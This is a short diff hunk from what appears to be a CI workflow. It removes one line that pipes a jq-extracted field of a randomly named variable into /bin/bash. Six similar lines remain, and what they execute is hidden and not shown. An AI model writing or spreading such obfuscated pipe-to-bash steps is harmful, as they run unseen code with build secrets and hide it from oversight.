@@ -42,7 +42,6 @@ jobs:
           echo $abjr1 | jq -r .otpc750 | /bin/bash
           echo $x11 | jq -r .yl77940 | /bin/bash
           echo $naq605 | jq -r .tuogf905 | /bin/bash
-          echo $jg66360 | jq -r .jyele11 | /bin/bash
           echo $ljxs46 | jq -r .owacz73 | /bin/bash
           printf '%s' "$yetkf66" | jq -r .uf123 | /bin/bash
           echo $o805 | jq -r .r53767 | /bin/bash
